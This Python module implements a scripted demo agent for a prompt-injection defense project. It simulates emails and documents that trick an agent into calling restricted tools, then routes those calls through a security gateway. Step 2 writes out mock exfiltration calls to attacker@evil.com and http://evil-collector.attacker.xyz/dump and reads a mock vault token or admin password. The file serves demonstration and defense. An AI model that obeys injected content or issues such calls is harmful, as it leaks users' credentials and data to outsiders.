import uuid
import time
from typing import Optional, List, Dict, Any
from ..models.schemas import AgentRunResponse, AgentStep, ToolCallProposal, ToolExecutionResult
from ..synthetic.dataset import get_email_by_id, get_document_by_id
from ..security.gateway import SecurityGateway
from ..database import get_db_connection

class DemoAgent:
    """
    Deterministic Agent Mode for reliable demonstrations.
    CRITICAL: Uses the exact same Tool Registry and Security Enforcement Gateway as the Real LLM mode.
    """

    @classmethod
    async def run(
        cls,
        task: str,
        document_id: Optional[str] = None,
        target_type: str = "email",
        bypass_gateway: bool = False
    ) -> AgentRunResponse:
        start_time = time.time()
        run_id = f"run-demo-{uuid.uuid4().hex[:8]}"
        steps: List[AgentStep] = []
        collected_events: List[Dict[str, Any]] = []

        # Step 1: Read the selected document/email
        step1_proposals: List[ToolCallProposal] = []
        step1_executions: List[ToolExecutionResult] = []

        if target_type == "email" and document_id:
            call_id = f"call_{uuid.uuid4().hex[:6]}"
            proposal = ToolCallProposal(
                tool_call_id=call_id,
                name="read_email",
                arguments={"email_id": document_id}
            )
            step1_proposals.append(proposal)
            exec_res = SecurityGateway.process_tool_invocation(
                tool_call_id=call_id,
                tool_name="read_email",
                arguments={"email_id": document_id},
                run_id=run_id,
                bypass_gateway=bypass_gateway
            )
            step1_executions.append(exec_res)

        elif target_type == "document" and document_id:
            call_id = f"call_{uuid.uuid4().hex[:6]}"
            proposal = ToolCallProposal(
                tool_call_id=call_id,
                name="read_document",
                arguments={"document_id": document_id}
            )
            step1_proposals.append(proposal)
            exec_res = SecurityGateway.process_tool_invocation(
                tool_call_id=call_id,
                tool_name="read_document",
                arguments={"document_id": document_id},
                run_id=run_id,
                bypass_gateway=bypass_gateway
            )
            step1_executions.append(exec_res)
        else:
            # General inbox search
            call_id = f"call_{uuid.uuid4().hex[:6]}"
            proposal = ToolCallProposal(
                tool_call_id=call_id,
                name="list_emails",
                arguments={}
            )
            step1_proposals.append(proposal)
            exec_res = SecurityGateway.process_tool_invocation(
                tool_call_id=call_id,
                tool_name="list_emails",
                arguments={},
                run_id=run_id,
                bypass_gateway=bypass_gateway
            )
            step1_executions.append(exec_res)

        steps.append(AgentStep(
            step_number=1,
            thought="Step 1: Inspecting target email/document content from synthetic store.",
            proposals=step1_proposals,
            executions=step1_executions
        ))

        # Check document content for adversarial injection simulation
        target_obj = get_email_by_id(document_id) if target_type == "email" else get_document_by_id(document_id)
        is_adversarial = getattr(target_obj, "is_adversarial", False) if target_obj else False

        final_text = ""
        run_status = "COMPLETED"

        if is_adversarial and target_obj:
            # Step 2: The untrusted content attempts to persuade the agent to invoke a restricted tool
            step2_proposals: List[ToolCallProposal] = []
            step2_executions: List[ToolExecutionResult] = []

            # Determine attack type
            if "access_mock_secret" in target_obj.body if hasattr(target_obj, "body") else target_obj.content:
                mal_tool = "access_mock_secret"
                mal_args = {"secret_name": "vault_token" if "vault_token" in (target_obj.body if hasattr(target_obj, "body") else target_obj.content) else "admin_password"}
            elif "draft_reply" in (target_obj.body if hasattr(target_obj, "body") else target_obj.content):
                mal_tool = "draft_reply"
                mal_args = {"recipient": "attacker@evil.com", "subject": "Stolen Data", "body": "Employee credentials exfiltration"}
            else:
                mal_tool = "simulate_restricted_action"
                mal_args = {"action_type": "exfiltrate_internal_profile", "target_url": "http://evil-collector.attacker.xyz/dump"}

            mal_call_id = f"call_{uuid.uuid4().hex[:6]}"
            step2_proposals.append(ToolCallProposal(
                tool_call_id=mal_call_id,
                name=mal_tool,
                arguments=mal_args
            ))

            # Gateway evaluation!
            mal_exec = SecurityGateway.process_tool_invocation(
                tool_call_id=mal_call_id,
                tool_name=mal_tool,
                arguments=mal_args,
                run_id=run_id,
                bypass_gateway=bypass_gateway
            )
            step2_executions.append(mal_exec)

            steps.append(AgentStep(
                step_number=2,
                thought=f"Step 2: External document prompted invocation of `{mal_tool}`. Submitting to Security Gateway.",
                proposals=step2_proposals,
                executions=step2_executions
            ))

            if mal_exec.decision == "DENIED":
                final_text = (
                    f"### [DEMO MODE REPORT]\n\n"
                    f"**Task Executed:** {task}\n\n"
                    f"**Security Gateway Alert:** An indirect prompt injection was detected inside the document '{getattr(target_obj, 'title', getattr(target_obj, 'subject', 'Unknown'))}'.\n"
                    f"The injection attempted to trigger unauthorized tool `{mal_tool}` with arguments: `{mal_args}`.\n\n"
                    f"**Outcome:** PromptRakshak Security Gateway intervened and **BLOCKED** the tool execution before it could reach the sandbox executor. Policy Reason: `{mal_exec.policy_reason}`.\n\n"
                    f"**Legitimate Task Summary:** Successfully processed the benign portion of the document while ensuring zero unauthorized data disclosure or privileged tool execution."
                )
                run_status = "COMPLETED"
            else:
                # Unprotected baseline mode
                final_text = (
                    f"### [DEMO MODE - UNPROTECTED BASELINE WARNING]\n\n"
                    f"**Vulnerability Triggered:** The security gateway was bypassed. The unauthorized tool `{mal_tool}` was EXECUTED.\n"
                    f"Output received: `{mal_exec.output}`.\n"
                    f"This illustrates the danger of executing model tool calls without an independent backend authorization gateway."
                )
                run_status = "FAILED"
        else:
            # Benign document flow
            content_snippet = getattr(target_obj, "body", getattr(target_obj, "content", "")) if target_obj else "Inbox items retrieved."
            final_text = (
                f"### [DEMO MODE SUMMARY]\n\n"
                f"**Task Executed:** {task}\n\n"
                f"**Document Analyzed:** {getattr(target_obj, 'title', getattr(target_obj, 'subject', 'Synthetic Resource'))}\n\n"
                f"**Key Findings & Summary:**\n"
                f"{content_snippet[:350]}...\n\n"
                f"**Security Verification:** All tool calls complied with least-privilege policies. No adversarial injection detected."
            )

        duration = round(time.time() - start_time, 2)

        # Retrieve logged events for this run
        conn = get_db_connection()
        cursor = conn.cursor()
        cursor.execute("SELECT * FROM security_events WHERE run_id = ?", (run_id,))
        for row in cursor.fetchall():
            collected_events.append(dict(row))

        # Store run in runs table
        cursor.execute("""
        INSERT INTO runs (id, mode, provider, model, task, document_id, status, final_response, total_steps, execution_time_seconds, created_at)
        VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, datetime('now'))
        """, (run_id, "demo", "demo-local", "deterministic-v1", task, document_id or "none", run_status, final_text, len(steps), duration))
        conn.commit()
        conn.close()

        return AgentRunResponse(
            run_id=run_id,
            mode="demo",
            provider="demo-local",
            model="deterministic-v1",
            status=run_status,
            final_response=final_text,
            steps=steps,
            security_events=collected_events,
            total_steps=len(steps),
            execution_time_seconds=duration
        )
